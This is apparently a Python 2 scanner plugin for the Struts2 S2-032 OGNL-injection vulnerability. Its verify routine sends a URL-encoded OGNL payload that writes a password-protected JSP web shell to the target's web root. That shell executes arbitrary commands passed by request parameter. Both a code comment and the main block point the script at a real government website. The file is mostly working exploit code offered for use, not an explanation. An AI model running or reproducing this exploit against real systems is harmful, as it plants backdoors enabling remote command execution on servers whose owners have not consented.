#!/usr/bin/env python
# encoding: utf-8
from ..t  import T
import random,urllib2
import httplib
import traceback
from termcolor import cprint

class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'
        result = {}
        timeout=10
        result['result']=False
        res=None
        jsp_file = str(random.randint(1000, 1000000)) + '.jsp'
        # gif89a<% if("024".equals(request.getParameter("pwd"))){
        #       java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("l")).getInputStream();
        #       int a = -1;
        #       byte[] b = new byte[2048];
        #       out.print("<pre>");
        #       while((a=in.read(b))!=-1){
        #           out.println(new String(b));
        #       }
        #       out.print(</pre>");
        #     }
        # %>
        content = 'gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.' \
              'getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%2' \
              '0%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%' \
              '29.exec%28request.getParameter%28%22l%22%29%29.getInputStre' \
              'am%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B' \
              '%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byt' \
              'e%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3C' \
              'pre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din' \
              '.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20' \
              '%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%2' \
              '0%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%' \
              '22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E'

        poc_url = "{url}?method:%23_memberAccess%3d@ognl.OgnlContext" \
              "@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0]," \
              "%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a)," \
              "%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23" \
              "fos%3dnew:java.io.FileOutputStream(%23b),%23fos.write(%23para" \
              "meters.content[0].getBytes()),%23fos.close(),%23hh%3d%23conte" \
              "xt.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23" \
              "b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23x" \
              "x:%23request.toString&reqobj=com.opensymphony.xwork2.dispatch" \
              "er.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatch" \
              "er.HttpServletResponse&reqobj=%2f&reqobj={filename}&content={" \
              "content}".format(url=target_url, filename=jsp_file, content=content)

# 'http://www.dcqjw.gov.cn:80/sflogin_usercenter.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=#parameters.reqobj[0],#c=#parameters.reqobj[1],#req=#context.get(#a),#b=#req.getRealPath(#c)+#parameters.reqobj[2],#fos=new:java.io.FileOutputStream(#b),#fos.write(#parameters.content[0].getBytes()),#fos.close(),#hh=#context.get(#parameters.rpsobj[0]),#hh.getWriter().println(#b),#hh.getWriter().flush(),#hh.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&reqobj=32203.jsp&content=gif89a<%\n    if("024".equals(request.getParameter("pwd"))){\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("l")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print("<pre>");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print("</pre>");\n    }\n%>'
	user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
	headers = { 'User-Agent' : user_agent }
        # print target_url
        try:
            res=urllib2.urlopen(poc_url, timeout=timeout)
            res_html = res.read()
        except (IOError, httplib.HTTPException):
            # print traceback.print_exc()
            return result
        finally:
            if res is not None:
                res.close()
                del res
        if jsp_file in res_html:
            cprint(target_url + '存在structs2032漏洞', 'red')
            info = target_url + "struts2032  Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts2032 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=poc_url
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = '高危(HOLE)'
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='www.dcqjw.gov.cn',port='80')                
            
            
